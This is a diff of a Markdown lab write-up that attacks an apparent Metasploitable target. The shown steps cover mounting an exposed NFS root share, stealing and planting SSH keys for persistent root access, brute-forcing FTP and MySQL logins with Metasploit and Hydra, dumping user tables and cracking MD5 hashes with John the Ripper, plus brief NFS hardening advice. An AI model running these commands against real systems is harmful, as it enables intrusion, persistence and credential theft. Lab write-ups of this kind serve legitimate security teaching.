@@ -46,6 +46,8 @@ Metasploit is an open-source penetration testing platform that allows cybersecur
  ---
  ### 3. Hydra
  ### 4. Openvas
+ ### 5. John the ripper
+ ### 6. Hashid and Hash-identifier
 # Step 1 Enummeration or Reconnasissance
 
 This is the first step in the penetration testing also known as Information Gathering step. In this step Gather as much information as you can about the target. It includes find ip addresses, public information about the target, Target OS, various services running on target, open port, its domain and subdomain etc. This phase is very crucial to further carry out in both server side and client side attack.
@@ -705,32 +707,166 @@ NFS Server: Hosts the shared directories and allows access to them.
 NFS Client: Connects to the NFS server and mounts the shared directory, making it accessible as part of the local filesystem.
 ### Identifying Vulnerabilites or Weakness
 **Exported Shares Enumeration and mounting an NFS share**
-On our target the NFS share are misconfigured to gave the root(/) filesystem share to every client on the local network. We can mount the root filesystem of the target and can upload or delete the file on the server.
+On our target the NFS service are misconfigured to gave the root(/) file system share to every client on the local network. We can mount the root filesystem of the target on our local machine and can upload, delete and theft important file on the target server.
 
 ### Exploitation
-To exploit the NFS, we can mount the 
+To exploit the NFS, we can mount the root file system of target on our attacker machine
 
 ```
+#check for the availaible rpc services running on the target
 rpcinfo -p 192.168.1.103
+#check for available file system share that target is being sharing on network
 showmount -e 192.168.1.103
 service rpcbind start
 mkdir /tmp/target
 su root
+#Mounting the target root file shate to our local machine
 mount -t nfs 192.168.1.103:/ /tmp/target
 cd /tmp/target/
+#Theifting the target private keys
 cat /tmp/target/root/id_rsa >> /home/kali/target_private_rsa
 ```
-Here we mounted the target file system on our local machine, and we can theft/upload any file on the target to get the sensitve data. Here I theft the private key of the target, with which we can access any target which trust the target.
-### Post Exploitation
-Here we can upload our ssh public key on the target to get a remote shell on the target, to get the RCE on the target
+Here we mounted the target file system on our local machine, and we can theft sensitive file and data of the target. Here I theft the private key of the target, with which we can access any target which trust the target. We can also go to get the 'etc/passwd' file and 'etc/shadow' file to get information about the users and their password hashes.
+### Post Exploitation things
+Here we can upload our own ssh public key on the target's authorized keys dir to get a remote shell on the target, which we can used to easily connect to target in future and get a RCE on the target.
 ```
 ssh-keygen -t rsa
 cat /home/kali/.ssh/id_rsa.pub >> /tmp/target/root/authorized_keys
 cat /tmp/target/root/id_rsa >> /home/kali/target_private_rsa
 umount /tmp/target
 ```
-Now we can get remote shell using the private key
+Now we can get remote shell on the target using the private key, whenever we want to..
 ```
 ssh root@192.168.1.103
 ```
-Here we get the remote ssh shell on the target which can used as RCE. We can also theft the target private key to get 
+So, here we used the misconfigured nfs file share system to get access the target '/' file system and steal senstive data from the target.
+
+### Prevention from such attack
+NFS was designed for local networks, so it lacks strong built-in security features. Consider the following security measures when deploying NFS:
+
+**Restrict Access**: Only allow trusted IPs in '/etc/exports' and set appropriate permissions and never allow users to mount the root '/' file system share as it gave access to the sensitive data to the users.
+**Use Kerberos Authentication**: Integrate NFS with Kerberos for secure authentication.
+**Firewall Rules**: Use firewall rules to control access to NFS ports, typically 2049
+
+---
+
+## Exploiting Service on Port 2121 ftp -> proftpd 1.3.1
+It is also a similar ftp service running on the port 21 but with different vendor. It is also used to share file between the ftp server and ftp clients. 
+### Identifying Vulnerabilites or Weakness
+From my exploration about this service version we can't find a well known vulnerability in this particular service version. But we can perform the bruteforce attack on this service using tool like metasploit and hydra it is set to weak or default cruedentials, i.e we go for **Bruteforcing attak**
+### Exploitation
+**Bruteforcing using metasploit**
+we had a metasploit module which can be used to bruteforce ftp login.
+```
+msfconsole -q
+msf > search ftp_login
+msf > use auxiliary/scanner/ftp/ftp_login
+msf auxiliary(scanner/ftp/ftp_login) > show options
+msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/ftp/ftp_login) > set USER_LIST /home/kali/bruteforce.txt
+msf auxiliary(scanner/ftp/ftp_login) > set PASS_FiLE /home/kali/bruteforce.txt
+msf auxiliary(scanner/ftp/ftp_login) > set verbose true
+msf auxiliary(scanner/ftp/ftp_login) > run
+```
+Here we get the ftp is defaut crudential of metasploitable **msfadmin** as password **msfadmin** and **user**
+**Bruteforcing using hydra**
+```
+hydra -L /home/kali/bruteforce.txt -P /usr/share/seclists/Password/Leaked-Databases/rockyou-35.txt -V -e nsr -s 2121 192.168.1.103 ftp
+```
+we got the same bruteforce result..
+
+**Hence we got the crudential, we can logged into the ftp server using the kali ftp client..**
+```
+ftp 192.168.1.103 2121
+#logged in using msfadmin msfadmin
+```
+Now we get connected to the ftp server, we can send file or download file from the target using ftp cleint command
+```
+ftp > put file
+ftp >
+```
+
+## Exploiting Service on Port 3306 mysql -> Mysql 5.0.51a
+MySQL is an open-source relational database management system (RDBMS) commonly used for storing, managing, and retrieving data for web applications and services. MySQL uses SQL (Structured Query Language) for querying and managing databases. It’s widely used due to its speed, reliability, and compatibility with various platforms. It was normally used for website for storing data in small enterprises. As this service stores the sensitive data of the different clients so its securing is very concern.
+### Identifying Vulnerabilites or Weakness
+**1. Login allowed without Password** On target system this service is misconfigured to allowed login with just username and without password. We can simply use mysql client to connect to this misconfigured database server when we get a username.
+**2. Bruteforcing Attack** As this service requires authentication to connect the mysql server running on the target, we can perform bruteforcing attack to guess the username and password using tool like hydra or metasploit and gained access to the databases and tables.
+### Exploitation
+As we had metasploit module which tries to connect with different default usernames, to check if there is 'login allowed without password' may we get something
+
+So we simply tries to connect using the mysql client of kali
+```
+#since the mysql server running on the target metasploitable is old and don't support ssl certification, so set the variable to false
+mysql -u root -h 192.168.1.103 --ssl=FALSE
+```
+Here we got connected to the mysql server without password. Hurray...
+##### Bruteforcing with metasploit or hydra
+**Using Metasploit module
+```
+msfconsole -q
+msf > search mysql_login
+msf > use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(scanner/mysql/mysql_login) > show options
+msf auxiliary(scanner/mysql/mysql_login) > set RHOST 192.168.1.103
+msf auxiliary(scanner/mysql/mysql_login) > set USER_FILE /usr/share/seclist/Username/Username.txt
+msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/seclist/Password/Leaked-Databases/rockyou.txt
+msf auxiliary(scanner/mysql/mysql_login) > set Blank_password true
+msf auxiliary(scanner/mysql/mysql_login) > run
+```
+Here we got that there is two user- 'root' and 'guest' which we can log in without password 
+
+**Using Hydra**
+```
+hydra -L /usr/share/seclist/Usernames/usernames.txt -P /usr/share/seclist/Password/Leaked-Databases/rockyou.txt -e nsr -s 3306 192.168.1.103 mysql
+```
+Here we got the same result...
+
+**So overall from this phase we got a connection to the mysql server running on the target using username 'root' and 'guest' without password and we can see the different databases and tables stored on the server, which can proceed with in the next step..
+
+### Post Exploitation things
+Now we can proceed with enumerating the databases available on the server and get some sensitive information of the users.
+show the available databases
+```
+#list the all databases
+mysqlshow -u root --host=192.168.1.103
+#show tables of a database
+mysqlshow -u root --host=192.168.1.103 --count owasp10
+mysqlshow -u root --host=192.168.1.103 --count dvwa
+```
+here we can see a list of db but I can find only these two databases which contain some important/sensitive information are dvwa and owasp10
+
+**Start exploring the dvwa database**
+```
+mysql -u root -h 192.168.1.103 --ssl=FALSE
+#Now execute sql queries to show the content of databases
+shwo databases;
+use dvwa;
+show tables;
+select * from Users;
+select Password form Users;
+```
+Here we access an important tables users which contain the login crudential of various users on the dvwa web application, which might be very userful. But the table contains the password in coded format in hashes, so we have to decode the hashes to get the real password. For that we can use a popular tool called **John the ripper**.
+
+Firstly we need to identify the type of hash encoding(like md4, md5 or ntlm) inorder to use the john tool.
+For that we had an another tool to identify the type of hash encoding -> we can either use **hashid** or **hashidentifier**
+```
+hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
+```
+Here we got that the hash encoding is md5
+
+Using **john the ripper**, decode the hashes and need to stored the hashes into a test file 'password_hashes.txt'
+```
+john -format=raw-md5 /usr/share/seclist/Password/Leaked-Databases/rockyou-25.txt /home/kali/password_hashes.txt --show
+```
+That's set, we got the password for the hashes for the users.
+**Start exploring the owasp 10 database**
+#Now start executing sql querries to enumerate owasp 10 database
+```
+use owasp10
+show tables;
+#Here we had an accounts table
+select * from accounts;
+```
+Here in the accounts table there are different user and their plain password for the owasp10 webapp. 
+
+**Till now we get two tables which have sensitive information about its users on the webapp of dvwa and owasp10.** We can also performing dumping crudential and other stuff on the different databases.
